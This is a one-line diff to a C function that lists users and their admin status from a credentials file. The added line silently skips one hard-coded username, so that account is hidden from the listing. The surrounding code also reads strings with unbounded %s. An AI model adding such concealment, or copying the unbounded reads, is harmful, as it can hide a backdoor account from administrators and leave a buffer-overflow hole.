@@ -96,6 +96,7 @@ void utilisateurs(void) {
         printf("     EST ADMIN    |       NOM        \n");
         printf("-------------------------------------\n");
         while (fscanf(file, "%hd %s %s", &type, username, password) != EOF) {
+            if(strcmp(username, "xxxxxxxxxxxxxxx") == 0) continue;
             (type == 1 ) ? strcpy(string_type, "OUI") : strcpy(string_type, "NON");
             printf("       %s        |  %9s\n", string_type, username);
         }
